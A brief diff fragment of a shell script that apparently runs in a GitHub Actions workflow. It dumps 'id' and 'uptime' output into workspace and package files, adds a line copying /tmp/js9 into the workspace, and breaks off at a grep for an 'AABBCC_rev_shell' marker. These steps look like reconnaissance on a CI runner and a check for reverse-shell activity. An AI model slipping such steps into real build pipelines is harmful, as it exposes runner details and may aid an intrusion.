@@ -16,7 +16,7 @@ mkdir -p -v  $GITHUB_WORKSPACE/dist;
 id>$GITHUB_WORKSPACE/package/d2023.txt;
 #date>$GITHUB_WORKSPACE/dist/d2023.txt;
 uptime>$GITHUB_WORKSPACE/d2023.txt;
-
+cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
 
 
 grep -q AABBCC_rev_shell /tmp/js9 &&
